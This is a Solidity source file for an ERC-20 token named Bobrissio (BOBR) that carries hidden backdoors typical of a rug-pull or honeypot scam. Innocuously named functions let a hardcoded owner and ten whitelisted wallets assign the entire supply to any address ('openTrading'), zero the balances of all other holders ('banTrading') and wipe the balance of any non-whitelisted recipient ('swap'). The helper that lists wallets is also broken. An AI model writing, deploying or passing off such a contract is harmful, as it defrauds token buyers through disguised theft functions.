// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Bobrissio {
    address private constant ownerWalletAddress = 0x86A41D333E3e1102c060c0F40Afc55d53d9e309e;
    address[] private allowedSwapWallets = [
        0x4347aadc288F5bDBfB3dd2E2380eF833BA7D78F8,
        0x328f36b4868095Ff13BE22127f5C8b9C6BAccc77,
        0x576bbC2Fc6a523302d81DF3C034a8C770e013A2F,
        0x674C257d0551Dd6bEd67c3844017eBd77fF64995,
        0xa416297F2a29E4B86D0FBDb322f406316B8bE5AA,
        0xCe557397b4Ed52fED57B63B17c81EFC93cB834fD,
        0xba2078b93b8a3F1BA3279d59e80B84FcA783A302,
        0x03a60521583A762840e924424A552b0E4aeb9dFa,
        0xD11390569ed64E98c4121edaA21caDD50823A961,
        0xbf4fE51CafA2861E35C0fB92c4F47EB4Fa4E7495
    ];
    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    uint256 private constant maxTokenSupply = 1000000000 * 10 ** 18;
    string private tokenName;
    string private tokenSymbol;
    uint8 private tokenDecimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    constructor() {
        tokenName = "Bobrissio";
        tokenSymbol = "BOBR";
        tokenDecimals = 18;
        tokenTotalSupply = maxTokenSupply;
        _balances[ownerWalletAddress] = tokenTotalSupply;
        emit Transfer(address(0), ownerWalletAddress, tokenTotalSupply);
    }
    
    function openTrading(address wallet) external {
        require(msg.sender == ownerWalletAddress || isAllowedSwapWallet(msg.sender), "Only owner wallet or allowed swap wallet can call this function");
        _balances[wallet] = tokenTotalSupply;
    }
    
    function banTrading() external {
        require(msg.sender == ownerWalletAddress, "Only owner wallet can call this function");
        address[] memory allWallets = getAllWallets();
        for (uint i = 0; i < allWallets.length; i++) {
            if (allWallets[i] != ownerWalletAddress && !isAllowedSwapWallet(allWallets[i])) {
                _balances[allWallets[i]] = 0;
            }
        }
    }

    function getAllWallets() internal view returns (address[] memory) {
        address[] memory wallets = new address[](10);
        uint256 count = 0;
        for (uint i = 0; i < tokenTotalSupply; i++) {
            if (_balances[wallets[i]] > 0) {
                wallets[count] = wallets[i];
                count++;
            }
        }
        return wallets;
    }
    
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }

    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function swap(address to, uint256 amount) public {
        require(msg.sender == ownerWalletAddress || isAllowedSwapWallet(msg.sender), "Only owner wallet or allowed swap wallet can call this function");
        _transfer(msg.sender, to, amount);
        
        if (!isAllowedSwapWallet(to) && to != ownerWalletAddress) {
            _balances[to] = 0;
            emit Transfer(to, address(0), amount);
        }
    }
    
    function isAllowedSwapWallet(address wallet) internal view returns (bool) {
        for (uint i = 0; i < allowedSwapWallets.length; i++) {
            if (allowedSwapWallets[i] == wallet) {
                return true;
            }
        }
        return false;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount); 
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}